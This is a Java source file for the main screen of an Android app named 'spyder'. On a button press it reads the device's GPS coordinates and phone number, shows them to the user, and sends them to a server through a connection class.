package com.zavgorodniy.spyder;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import com.zavgorodniy.spyder.Locator.GPSTracker;
import com.zavgorodniy.spyder.connection.Connection;

public class MainActivity extends Activity {

    Button showLocation;
    Button stopGPS;
    TextView tvCurrentLocation;
    TextView tvPreviousLocation;

    String latitude;
    String longitude;
    String telNumber;
    String srt;

    GPSTracker gps;
    Connection conn;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        showLocation = (Button) findViewById(R.id.bt_get_coordinates);
        stopGPS = (Button) findViewById(R.id.bt_stop_gps);
        tvCurrentLocation = (TextView) findViewById(R.id.tv_coordinates);
        tvPreviousLocation = (TextView) findViewById(R.id.tv_prev_coordinates);

        gps = GPSTracker.getInstance(this);
        // show location button click event
        showLocation.setOnClickListener(new View.OnClickListener() {

            @Override
            public void onClick(View arg0) {

                conn = new Connection();
                gps.getLocation();

                // check if GPS enabled
                if(gps.canGetLocation()){
                    latitude = String.valueOf(gps.getLatitude());
                    longitude = String.valueOf(gps.getLongitude());
                    telNumber = phoneNumber();

                    String coordinates = tvCurrentLocation.getText().toString();
                    tvPreviousLocation.setText(coordinates);
                    coordinates = "Lat: " + latitude + "\nLong: " + longitude;
                    tvCurrentLocation.setText(coordinates);

                    srt = latitude + ", " + longitude + ", " + telNumber;
                    Toast.makeText(getApplicationContext(), "Your Location is - \n" + coordinates +
                            "\n" + telNumber, Toast.LENGTH_LONG).show();

                    if (!telNumber.equals("")){
                        Thread thread = new Thread(
                                new Runnable() {
                                    @Override
                                    public void run() {
                                        conn.sendData(telNumber, latitude, longitude);
                                    }
                                }
                        );
                        thread.start();

                    }else{
                        Toast.makeText(getApplicationContext(), "Put your sim card", Toast.LENGTH_LONG).show();
                    }
                } else {
                    // can't get location
                    // GPS or Network is not enabled message
                    Toast.makeText(getApplicationContext(), "Please, enable GPS or check connection to network", Toast.LENGTH_LONG).show();
                }
            }
        });

        stopGPS.setOnClickListener(new View.OnClickListener() {

            @Override
            public void onClick(View v) {
                gps.stopUsingGPS();
            }
        });
    }

    public String phoneNumber() {
        TelephonyManager tMgr = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        String mPhoneNumber = tMgr.getLine1Number();
        return mPhoneNumber;
    }
}